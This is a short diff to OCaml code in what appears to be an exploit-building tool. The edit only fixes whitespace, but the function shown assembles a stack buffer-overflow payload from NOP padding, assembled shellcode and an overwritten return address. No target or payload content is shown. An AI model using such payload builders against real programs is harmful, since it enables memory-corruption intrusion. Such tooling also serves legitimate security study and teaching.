@@ -18,7 +18,7 @@ let exploit buff_size payload call =
   let adr   = List.rev (parse_bytes call) |> pad_adr in
   let asm   = Asm.asm payload in
   let pay   = Asm.asm_bytes asm in
-  let payl   = Asm.asm_size asm in
+  let payl  = Asm.asm_size asm in
   let buff  = Array.make (buff_size + 8 + payl) nop in
   Array.iteri (fun i x -> buff.(buff_size + 8 + i) <- x) pay;
   List.iteri (fun i x -> buff.(buff_size + i) <- x) adr;
